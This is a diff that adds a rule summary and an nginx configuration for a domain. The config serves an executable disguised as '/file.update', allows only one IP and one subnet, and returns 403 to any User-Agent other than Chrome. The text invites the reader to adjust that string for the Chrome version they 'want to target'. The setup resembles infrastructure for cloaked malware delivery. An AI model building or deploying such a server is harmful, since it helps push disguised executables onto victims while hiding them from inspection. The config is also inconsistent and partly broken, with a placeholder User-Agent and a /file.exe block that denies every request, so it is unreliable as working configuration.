@@ -1,0 +1,65 @@
+Access Control:
+    Allow access only for IP 132.142.148.119 and subnet 134.209.242.0/24.
+    Deny access for all other IP addresses.
+
+Content Delivery Rules:
+    Serve /file.update as file.exe.
+    Restrict access to /file.update based on the User-Agent being Google Chrome.
+    Return 403 Forbidden if User-Agent is not Google Chrome.
+
+Rate Limiting:
+    Limit requests to /file.exe to 5 per minute.
+    Return 503 Service Unavailable if limit exceeded.
+
+These rules collectively control access to specific resources based on IP, User-Agent (Google Chrome), and request rate limitations. 
+Adjust the User-Agent string as needed based on the specific version of Google Chrome you want to target.
+
+
+
+
+http {
+    # Define a shared memory zone to store IP addresses and their request counts.
+    limit_req_zone $binary_remote_addr zone=one:10m rate=5r/m;
+
+    server {
+        listen 80;
+        server_name fattifattituoi.it;
+
+        location / {
+            # Allow traffic from the specific IP address and subnet.
+            allow 132.142.148.119;
+            allow 134.209.242.0/24;
+            # Deny access to all other IP addresses.
+            deny all;
+
+            # Limit access only to a specific User-Agent.
+            # Deny access to all other HTTP methods.
+            limit_except GET {
+                deny all;
+            }
+
+            # Serve the specific file with a different extension.
+            location = /file.update {
+                # Check if the User-Agent is not the desired User-Agent.
+                if ($http_user_agent != "YourDesiredUserAgent") {
+                    return 403;  # Forbidden
+                }
+
+                alias /www/var/html/file.exe;
+                add_header Content-Disposition "attachment; filename=file.update";
+                types {
+                    application/octet-stream exe;
+                }
+            }
+
+            # Limit requests for /file.exe to 5 requests per minute.
+            location = /file.exe {
+                limit_req zone=one burst=5 nodelay;
+                deny all;
+                return 503;  # Service Unavailable
+            }
+        }
+
+        # Additional server configuration goes here
+    }
+}
